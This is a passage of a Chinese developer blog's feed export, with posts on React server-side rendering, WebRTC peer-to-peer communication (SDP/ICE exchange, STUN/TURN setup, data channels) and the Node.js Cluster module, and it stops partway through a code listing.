charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;react-ssr&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div id="container"&gt;&lt;div&gt;<span class="subst">$&#123;html&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;script&gt;</span></span><br><span class="line"><span class="string">                window.__INITIAL_STATE__ = <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(initState)&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/script&gt;</span></span><br><span class="line"><span class="string">            &lt;script src=<span class="subst">$&#123;main&#125;</span>&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">handleRender</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    match(&#123;<span class="attr">routes</span>:routesApp,<span class="attr">location</span>:req.url&#125;,(err,redirectLocation,renderProps)=&gt;&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            res.status(<span class="number">500</span>).end(<span class="string">`server error: <span class="subst">$&#123;err&#125;</span>`</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(redirectLocation)&#123;</span><br><span class="line">            res.redirect(redirectLocation.pathname+redirectLocation.search)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(renderProps)&#123;</span><br><span class="line">            <span class="keyword">const</span> store = storeApp(&#123;&#125;);</span><br><span class="line">            <span class="built_in">Promise</span>.all([</span><br><span class="line">                store.dispatch(selectAuthor(<span class="string">'all'</span>)),</span><br><span class="line">                store.dispatch(fetchPostsIfNeeded(<span class="string">'all'</span>))</span><br><span class="line">            ])</span><br><span class="line">            .then(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="keyword">const</span> html = renderToString(</span><br><span class="line">                    &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">                        &lt;RouterContext &#123;...renderProps&#125;/&gt;</span><br><span class="line">                    &lt;<span class="regexp">/Provider&gt;</span></span><br><span class="line"><span class="regexp">                )</span></span><br><span class="line"><span class="regexp">                const finalState = store.getState();</span></span><br><span class="line"><span class="regexp">                res.end(renderFullPage(html,finalState));</span></span><br><span class="line"><span class="regexp">            &#125;)</span></span><br><span class="line"><span class="regexp">        &#125; else &#123;</span></span><br><span class="line"><span class="regexp">            res.status(404).end('404 not found')</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &#125;)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="其他部分"><a href="#其他部分" class="headerlink" title="其他部分"></a>其他部分</h3><p>sever部分除了react首屏渲染部分外，其余和我之前的项目vue-express-forum差不多，由于篇幅限制，这里就不详解了。感兴趣移步我的文章:<a href="http://luoxia.me/code/2016/11/01/JWTs%E4%B9%8B%E6%88%91%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%AE%8C%E5%85%A8%E5%88%86%E7%A6%BB%E5%AE%9E%E8%B7%B5/">JWTs之我的前后端完全分离实践</a>.</p><p>另外开发过程中遇到了许多坑，其中有些坑都是一些依赖的版本问题。所以当遇到问题无法解决时，更改依赖版本，或许就能解决。如这个项目的node-sass，react-router使用最新版都会存在不兼容问题哦。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>可见react的生态是非常丰富的，它的诞生引入了许多多新的概念，也使得JS的发展焕发蓬勃生机。这里也不得不提到Vue2.0，它也正式支持了服务端渲染。这方面还有许多东西有待研究。</p><p>这个寒假也只剩下最后的10天了，珍惜时光，不负青春。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;所谓Isomorphic应用即为前后端共用代码的同构应用。与之对应的还有Universal应用，得益于virtual DOM，使得同一套js代码可以运行在各个环境如web, 安卓/IOS,桌面应用等。&lt;/p&gt;
&lt;p&gt;为什么要同构？SPA大大改善了用户体验，但是也存在一些问题，如SEO,首屏渲染效率问题。于是就有一种方案便是SSR即服务端渲染。如React的SSR,通过在server端获取初始state,返回已经含有数据的DOM结构，再交给客户端实例化React，之后客户端接手路由渲染任务，而这一部分能够共用一套代码再好不过了。&lt;/p&gt;
&lt;p&gt;文章以我的实际项目为例，分析整个应用的技术架构，总结一系列问题如服务端渲染组件时的静态资源问题等。&lt;/p&gt;
&lt;p&gt;项目运用React,redux,react-router,React SSR, express,mongoose, Ant design, webpack技术栈，欢迎star:&lt;a href=&quot;https://github.com/laoqiren/isomorphic-redux-forum&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/laoqiren/isomorphic-redux-forum&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="React" scheme="http://luoxia.me/code/categories/React/"/>
    
    
      <category term="webpack" scheme="http://luoxia.me/code/tags/webpack/"/>
    
      <category term="server-rendering" scheme="http://luoxia.me/code/tags/server-rendering/"/>
    
      <category term="react" scheme="http://luoxia.me/code/tags/react/"/>
    
      <category term="redux" scheme="http://luoxia.me/code/tags/redux/"/>
    
      <category term="react-router" scheme="http://luoxia.me/code/tags/react-router/"/>
    
      <category term="同构" scheme="http://luoxia.me/code/tags/%E5%90%8C%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>WebRTC通信初探</title>
    <link href="http://luoxia.me/code/2017/01/23/WebRTC%E9%80%9A%E4%BF%A1%E5%88%9D%E6%8E%A2/"/>
    <id>http://luoxia.me/code/2017/01/23/WebRTC通信初探/</id>
    <published>2017-01-23T02:17:37.000Z</published>
    <updated>2017-11-16T13:10:06.486Z</updated>
    
    <content type="html"><![CDATA[<p>WebRTC是由谷歌收购GIPS公司开源的一项用于方便实现音频和视频实时P2P通信的技术。除了音频和视频通信外，还支持其他包括字符串，Blob,ArrayBuffer,ArrayBufferView等数据类型的传输。</p><p>与之前聊过的WebSocket应用层协议不同，虽然都能实现实时通信，但是ws实现server-client的全双工通信，而WebRTC实现了端对端的通信技术，不依赖于服务器，在视频直播会议，游戏，文件传输等领域发挥着重要作用。</p><p><strong>文章目录</strong></p><ol><li>WebRTC底层架构</li><li>MediaStream获取音视频数据流</li><li>RTCPeerConnection实现P2P通信</li><li>NAT/防火墙 穿越技术</li><li>RTCDataChannel API</li><li>遇到的问题总结</li></ol><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/f1d3e86b156c3c663fab85434ee07858_b.png" alt="WebRTC"><br><a id="more"></a></p><h2 id="底层架构"><a href="#底层架构" class="headerlink" title="底层架构"></a>底层架构</h2><p>上图实为WebRTC的底层架构，可以其用到的技术非常多的，包括视频音频处理以及网络传输，防火墙穿越等技术。</p><hr><p>WebRTC有三个模块，Voice Engine(音频引擎)，Video Engine(视频引擎)，Transport。Voice Engine包含iSAC/iLBC Codec(音频编解码器，前者是针对宽带和超宽带，后者是针对窄带)，NetEQ for voice(处理网络抖动和语音包丢失)，Echo Canceler(回声消除器)，Noise Reduction(噪声抑制)；Video Engine包含VP8 Codec(视频图像编解码器)，Video jitter buffer(视频抖动缓冲器，处理视频抖动和视频信息包丢失)，Image enhancements(图像质量增强)。Transport包含SRTP(安全的实时传输协议，用以音视频流传输)，Multiplexing(多路复用)，P2P，STUN+TURN+ICE(用于NAT网络和防火墙穿越的)。除此之外，安全传输可能还会用到DTLS(数据报安全传输)，用于加密传输和密钥协商。整个WebRTC通信是基于UDP的</p><h2 id="MediaStream获取音视频数据流"><a href="#MediaStream获取音视频数据流" class="headerlink" title="MediaStream获取音视频数据流"></a>MediaStream获取音视频数据流</h2><h3 id="getUserMedia-constraints-successCallback-errCallback"><a href="#getUserMedia-constraints-successCallback-errCallback" class="headerlink" title="getUserMedia(constraints,successCallback,errCallback)"></a>getUserMedia(constraints,successCallback,errCallback)</h3><p>navigator上的方法，用于获取用户授权提供的音频视频数据流，三个参数分别为约束对象，成功的回调函数，发送错误的回调函数。</p><h3 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a>浏览器兼容性</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getUserMedia = (navigator.getUserMedia || </span><br><span class="line">                    navigator.webkitGetUserMedia || </span><br><span class="line">                    navigator.mozGetUserMedia || </span><br><span class="line">                    navigator.msGetUserMedia);</span><br></pre></td></tr></table></figure><h3 id="上栗子：MediaStream和Canvas实现拍照功能"><a href="#上栗子：MediaStream和Canvas实现拍照功能" class="headerlink" title="上栗子：MediaStream和Canvas实现拍照功能"></a>上栗子：MediaStream和Canvas实现拍照功能</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getUserMedia = (navigator.getUserMedia || </span><br><span class="line">                    navigator.webkitGetUserMedia || </span><br><span class="line">                    navigator.mozGetUserMedia || </span><br><span class="line">                    navigator.msGetUserMedia);</span><br><span class="line"><span class="keyword">let</span> video = <span class="built_in">document</span>.getElementById(<span class="string">'video'</span>),</span><br><span class="line">canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>),</span><br><span class="line">ctx = canvas.getContext(<span class="string">'2d'</span>),</span><br><span class="line">localStream = <span class="literal">null</span>;</span><br><span class="line">getUserMedia(&#123;<span class="attr">video</span>:<span class="literal">true</span>,<span class="attr">audio</span>:<span class="literal">true</span>&#125;,stream=&gt;&#123;</span><br><span class="line">    video.src = <span class="built_in">window</span>.URL.createObjectURL(stream);</span><br><span class="line">    localStream = stream;</span><br><span class="line">&#125;,err=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'get stream failed!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">video.addEventListener(<span class="string">'click'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(localStream)&#123;</span><br><span class="line">        ctx.drawImage(video,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">'img'</span>).src = canvas.toDataURL(<span class="string">'image/png'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="RTCPeerConnection实现P2P通信"><a href="#RTCPeerConnection实现P2P通信" class="headerlink" title="RTCPeerConnection实现P2P通信"></a>RTCPeerConnection实现P2P通信</h2><p>P2P通信基于UDP传输协议，更加注重传输实时性。P2P建立过程是比较复杂的。主要是交换SDP和ICE信息。<br><img src="http://images.cnitblog.com/blog2015/57211/201503/250050215053233.png" alt="P2P"></p><p>上图所示为利用信令服务器实现P2P通信的流程图，其中还包含了STUN服务器（非WebRTC实现)</p><h3 id="P2P通信建立过程"><a href="#P2P通信建立过程" class="headerlink" title="P2P通信建立过程"></a>P2P通信建立过程</h3><h4 id="交换SDP"><a href="#交换SDP" class="headerlink" title="交换SDP"></a>交换SDP</h4><p>SDP是一种会话描述协议（Session Description Protocol），包含了一系列信息包括会话使用的媒体种类，双方ip和port,带宽，会话属性等。</p><p>SDP交换采用Offer/Answer形式。</p><ol><li>首先Offer方通过new RTCPeerConnection(config)建立PeerConnection</li><li>Offer方通过createOffer生成sessionDescription，设置localDescription,并通过信令服务器发送给Answer方</li><li>Answer方收到offer,发现并没有与之对应的peerConnection,新建peerConnection,并设置remoteDescription</li><li>Answer方通过createAnswer生成sessionDescripton,设置localDescription,并通过信令服务器发送answer</li><li>Offer方收到answer,设置remoteDescription</li><li>SDP交换结束</li></ol><h4 id="交换ICE"><a href="#交换ICE" class="headerlink" title="交换ICE"></a>交换ICE</h4><p>ICE是一种用于实现NAT/防火墙穿越的协议，可以实现:</p><ol><li>P2P直接通信</li><li>使用STUN服务器实现突破NAT的P2P通信</li><li>使用TURN中继服务器实现突破防火墙的中继通信</li></ol><p>交换过程：</p><ol><li>双方在new RTCPeerConnection(config)建立连接后，当网络候选者可用时，会触发icecandidate事件</li><li>在onicecandidate事件处理程序中将candidate通过信令服务器发送给对方</li><li>双方在接受到彼此的candidate后，通过addIceCandidate将对方的candidate加入到PeerConnection实例中。</li></ol><p>在连接建立前或者建立后调用peerConnection.addStream()方法将本地视频/音频数据流加入到connection当中，当对方接受到视频流时会触发addStream事件，在其处理程序中我们可以接受数据流将其显示。</p><h3 id="基于Socket-io和WebRTC的两人视频聊天室"><a href="#基于Socket-io和WebRTC的两人视频聊天室" class="headerlink" title="基于Socket.io和WebRTC的两人视频聊天室"></a>基于Socket.io和WebRTC的两人视频聊天室</h3><p>上述过程的信令服务器可以使用WebSocket服务，而Node.js可以方便的实现ws服务，socket.io更是封装了一系列API，可以方便的实现多人视频聊天室，多人视频聊天室有需要注意一些其他诸如SDP冲突问题，这里先以两人通信为例来更深入理解整个过程。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码较多这里省略</span></span><br></pre></td></tr></table></figure><h2 id="NAT-防火墙穿越技术"><a href="#NAT-防火墙穿越技术" class="headerlink" title="NAT/防火墙穿越技术"></a>NAT/防火墙穿越技术</h2><p>之所以将NAT/防火墙单独出来，是因为NAT/防火墙问题是建立端对端通信的一个重要问题<br><img src="http://lingyu.wang/img/WebRTC/3.png" alt="STUN"></p><h3 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h3><p>NAT将连接到公网的全局ip转换为内网ip，实现多个终端通信，防止受到来自外网的攻击，有效节省IPV4数量。WebRTC必须穿越NAT进行通信。ICE可以通过STUN技术穿越NAT。</p><p>NAT的实现方式有三种，即静态转换Static Nat、动态转换Dynamic Nat和端口多路复用OverLoad。目前用得比较多的就是端口多路复用。</p><p>STUN服务器可以是自己搭建的，也可以是直接使用现成的，比如谷歌的stun服务:stun:stun.l.google.com:19302</p><p>自己搭建STUN服务器比较简单，这里篇幅有限，省略</p><p>配置好STUN服务，以此建立RTCPeerConnection,配置方法就是上面的config对象:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line"><span class="string">"iceServers"</span>:[&#123;<span class="string">"url"</span>:<span class="string">"stun:stun.yourdomain.com:3478"</span>&#125;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> peer = <span class="keyword">new</span> RTCPeerConnection(config);</span><br></pre></td></tr></table></figure><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>对于防火墙，需要依靠TURN服务器来进行通信。起一各TURN服务器监听在某个端口时，需要设置防火墙开发这个端口。搭建TURN服务器也比较简单，在这里也省略。</p><p>同样也要配置好config:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line"><span class="string">"iceServers"</span>:[</span><br><span class="line">&#123;<span class="string">"url"</span>:<span class="string">"stun:stun.yourdomain.com:3478"</span>&#125;,&#123;<span class="string">"url"</span>:<span class="string">"turn:turn.yourdomain.com:3478"</span>,<span class="string">"username"</span>:<span class="string">"yourid"</span>,<span class="string">"credential:"</span>yourpassword<span class="string">"&#125;]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">let peer = new RTCPeerConnection(config);</span></span><br></pre></td></tr></table></figure><h2 id="RTCDataChannel-API"><a href="#RTCDataChannel-API" class="headerlink" title="RTCDataChannel API"></a>RTCDataChannel API</h2><p>既然可以实现音频视频的实时通信，为何不可以实现文本，文件等数据的传输呢？RTCDataChannel API就提供了这个功能。它通过将数据直接从一个浏览器发送到另一个浏览器，不需要将数据通过服务器来进行中转发送，简化了过程，保证实时性，同时还确保数据的安全私密性。</p><p>RTCDataChannel 与RTCPeerConnection API相结合，使用SCTP（流控制传输协议）实现稳定有序的数据传递。其仍然需要信令服务器的参与。以及STUN和TURN服务器来穿越NAT/防火墙。</p><p>RTCDataChannel支持两种模式运行：不可信赖模式（类似UDP)和可信赖模式（类似于TCP)。</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><ol><li>通过config建立RTCPeerConnection</li><li>通过peerConnection.createDataChannel(label,dataChannelConfig)获取dataChannel对象</li><li>按照上述P2P建立流程完成SDP和ICE信息交换</li><li>调用send()方法发送消息</li><li>接收方监听message事件，获取数据</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dataChannel = peerConnection.createDataChannel(<span class="string">'dataChannel'</span>,&#123;<span class="string">'reliable:false'</span>&#125;);</span><br></pre></td></tr></table></figure><p>详细API可查看WebRTC官网</p><h2 id="遇到的问题总结"><a href="#遇到的问题总结" class="headerlink" title="遇到的问题总结"></a>遇到的问题总结</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;WebRTC是由谷歌收购GIPS公司开源的一项用于方便实现音频和视频实时P2P通信的技术。除了音频和视频通信外，还支持其他包括字符串，Blob,ArrayBuffer,ArrayBufferView等数据类型的传输。&lt;/p&gt;
&lt;p&gt;与之前聊过的WebSocket应用层协议不同，虽然都能实现实时通信，但是ws实现server-client的全双工通信，而WebRTC实现了端对端的通信技术，不依赖于服务器，在视频直播会议，游戏，文件传输等领域发挥着重要作用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文章目录&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;WebRTC底层架构&lt;/li&gt;
&lt;li&gt;MediaStream获取音视频数据流&lt;/li&gt;
&lt;li&gt;RTCPeerConnection实现P2P通信&lt;/li&gt;
&lt;li&gt;NAT/防火墙 穿越技术&lt;/li&gt;
&lt;li&gt;RTCDataChannel API&lt;/li&gt;
&lt;li&gt;遇到的问题总结&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://7xsi10.com1.z0.glb.clouddn.com/f1d3e86b156c3c663fab85434ee07858_b.png&quot; alt=&quot;WebRTC&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="HTML5" scheme="http://luoxia.me/code/categories/HTML5/"/>
    
    
      <category term="HTML5" scheme="http://luoxia.me/code/tags/HTML5/"/>
    
      <category term="WebRTC" scheme="http://luoxia.me/code/tags/WebRTC/"/>
    
  </entry>
  
  <entry>
    <title>Cluster模块</title>
    <link href="http://luoxia.me/code/2016/11/27/Cluster%E6%A8%A1%E5%9D%97/"/>
    <id>http://luoxia.me/code/2016/11/27/Cluster模块/</id>
    <published>2016-11-27T15:15:15.000Z</published>
    <updated>2017-11-16T13:10:06.484Z</updated>
    
    <content type="html"><![CDATA[<p>Node的一大优点就是异步IO,适合I/O密集型的高并发业务，但是它是单线程的，当面对CPU密集型业务的时候，性能就会出现瓶颈。但是幸运的是，子进程能够解决这个问题，与HTML5的Web Worker类似，通过主进程管理一系列的子进程来利用多核CPU以实现集群的功能。</p><p>关于集群是一个比较大的话题。Node原生Child_process就可以实现集群，但是要处理好一系列问题，如自动重启，自杀信号，负载均衡等问题，需要我们做大量的工作。从Node V0.8开始，其内置一个核心模块Cluster,帮助我们更加方便的实现单机集群。</p><a id="more"></a><h3 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cluster = <span class="built_in">require</span>(<span class="string">'cluster'</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> numCPUs = <span class="built_in">require</span>(<span class="string">'os'</span>).cpus().length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cluster.isMaster) &#123;</span><br><span class="line">  <span class="comment">// Fork workers.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; numCPUs; i++) &#123;</span><br><span class="line">    cluster.fork();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cluster.on(<span class="string">'exit'</span>, (worker, code, signal) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`worker <span class="subst">$&#123;worker.process.pid&#125;</span> died`</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// Workers can share any TCP connection</span></span><br><span class="line">  <span class="comment">// In this case it is an HTTP server</span></span><br><span class="line">  http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'hello world\n'</span>);</span><br><span class="line">  &#125;).listen(<span class="number">8000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就会根据计算机cpu情况，创建多个子进程来处理服务，对于TCP服务，实现多个子进程共享端口。</p><p>or一种分离worker逻辑的方式:</p><p>master.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cluster = <span class="built_in">require</span>(<span class="string">'cluster'</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> numCPUs = <span class="built_in">require</span>(<span class="string">'os'</span>).cpus().length;</span><br><span class="line"></span><br><span class="line">cluster.setupMaster(&#123;</span><br><span class="line">        exec:<span class="string">"worker.js"</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>worker.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'hello world\n'</span>);</span><br><span class="line">  &#125;).listen(<span class="number">8000</span>);</span><br></pre></td></tr></table></figure></p><h3 id="IPC进程间通信"><a href="#IPC进程间通信" class="headerlink" title="IPC进程间通信"></a>IPC进程间通信</h3><p>master和worker之间通过IPC通道通信，在Node中IPC通道由libuv提供，在Windows下由命名管道(named pipe)实现，*nix系统采用Unix Domain Socket实现。而经过libuv抽象后，就是十分简单的message事件和send()方法。</p><hr><p>父进程在创建子进程之前，先创建IPC通道并对其进行监听，再创建出子进程，并通过环境变量(NODE_CHANNEL_FD)告诉子进程这个IPC通道的文件描述符。子进程在启动过程中，根据文件描述符去连接这个IPC通道。</p><p>IPC通道被抽象为流对象。</p><h3 id="句柄传递"><a href="#句柄传递" class="headerlink" title="句柄传递"></a>句柄传递</h3><p>当我们直接通过创建多个worker来监听同一端口时,会报错:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: listen EADDRINUSE</span><br></pre></td></tr></table></figure></p><p>由于一个工作进程已经监听某个端口，其余进程再次监听将会抛出错误，那要如何实现监听同一端口呢？</p><h4 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h4><p>句柄是一种可以用来标识资源的引用，内部包含了指向对象的文件描述符。</p><h4 id="句柄发送与还原"><a href="#句柄发送与还原" class="headerlink" title="句柄发送与还原"></a>句柄发送与还原</h4><p>Child_process在发送消息到IPC之前，会将消息进行封装，一个句柄文件描述符，一个message对象,最终子进程收到消息后做如下操作:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">message,handle,emit</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> server = <span class="keyword">new</span> net.Server();</span><br><span class="line">server.listen(handle,()=&gt;&#123;</span><br><span class="line">emit(server);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，Node进程之间传递的并非是真正地传递socket对象，而是进行消息传递。</p><h4 id="SO-REUSEADDR端口重用"><a href="#SO-REUSEADDR端口重用" class="headerlink" title="SO_REUSEADDR端口重用"></a>SO_REUSEADDR端口重用</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setsockopt(tcp-&gt;io_wather.fd,SOL_SOCKET,SO_REUSEADDR,&amp;on,sizeof(on))</span><br></pre></td></tr></table></figure><p>通过send()发送的句柄还原出来的服务，文件描述符相同，就可以监听在同一端口了。</p><h3 id="Cluster实现原理"><a href="#Cluster实现原理" class="headerlink" title="Cluster实现原理"></a>Cluster实现原理</h3><p>Cluster实际上就是child_process和net模块的组合应用。</p><p>文章开头的例子，Cluster会启动TCP服务器，然后fork子进程时会将TCP服务的socket文件描述符发送给worker,然后通过句柄还原，拿到该文件描述符，然后启动http服务，并监听在这个文件描述符上面。</p><h3 id="部分常用Cluster事件及API"><a href="#部分常用Cluster事件及API" class="headerlink" title="部分常用Cluster事件及API"></a>部分常用Cluster事件及API</h3><h4 id="master相关"><a href="#master相关" class="headerlink" title="master相关"></a>master相关</h4><p><strong>fork</strong><br>当一个新worker被fork时，可以监听该事件来设置timeOut,用以测试网络连接是否正常，如果网络连接超时就报错或者杀掉子进程。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> timeouts = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">errorMsg</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(<span class="string">'Something must be wrong with the connection ...'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cluster.on(<span class="string">'fork'</span>, (worker) =&gt; &#123;</span><br><span class="line">  timeouts[worker.id] = setTimeout(errorMsg, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line">cluster.on(<span class="string">'listening'</span>, (worker, address) =&gt; &#123;</span><br><span class="line">  clearTimeout(timeouts[worker.id]);</span><br><span class="line">&#125;);</span><br><span class="line">cluster.on(<span class="string">'exit'</span>, (worker, code, signal) =&gt; &#123;</span><br><span class="line">  clearTimeout(timeouts[worker.id]);</span><br><span class="line">  errorMsg();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>listening</strong></p><p>worker调用listen()即共享Socket后，发送一条listening消息给master,master触发</p><p><strong>disconnect</strong></p><p>当master和worker端口IPC通道后触发，这个事件和exit事件触发之间是有一定的时间间隔的，这样可以让worker平稳安全的关闭，在进程被杀掉之前，可以close一些服务，如长连接这种断开需要一定时间的服务。close完后再exit</p><p>当worker在超过一定时间后还没有挂掉，我们可以强制性地将其over掉:</p><p>cluster.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 